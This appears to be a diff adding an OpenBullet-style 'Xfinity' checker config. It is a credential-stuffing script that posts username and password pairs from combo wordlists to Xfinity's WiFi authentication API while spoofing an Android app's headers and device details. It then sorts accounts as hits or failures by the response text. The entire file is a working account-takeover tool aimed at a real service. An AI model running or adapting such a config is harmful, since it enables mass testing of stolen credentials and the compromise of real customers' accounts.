@@ -1,0 +1,37 @@
+[SETTINGS]
+{
+  "Name": "Xfinity",
+  "SuggestedBots": 10,
+  "LastModified": "2018-05-14T15:27:43.4039961+02:00",
+  "AdditionalInfo": "",
+  "Author": "Chaos",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "prov.wifi.xfinity.com/api/api.php" AutoRedirect=TRUE 
+  CONTENT "{\"auth_request\":{\"appId\":\"00013\",\"appVer\":\"5.0.5 (551)\",\"callType\":\"R\",\"device\":{\"browser\":\"\",\"browserVersion\":\"\",\"cm\":\"02:00:00:00:00:00\",\"os\":\"Android\",\"osVersion\":\"8.0.0\",\"resourceType\":\"samsung SM-N950F\"},\"get_mobileconfig\":\"false\",\"key\":\"HhVp8NKFM9wYYAZfXChkDcWWmphqAfttYmfewgvS86rZpNX9\",\"password\":\"<PASS>\",\"username\":\"<USER>\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-N950F Build/R16NW)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "appId: appId" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "auth_failure" 
+  KEYCHAIN Success OR 
+    KEY "auth_success" 
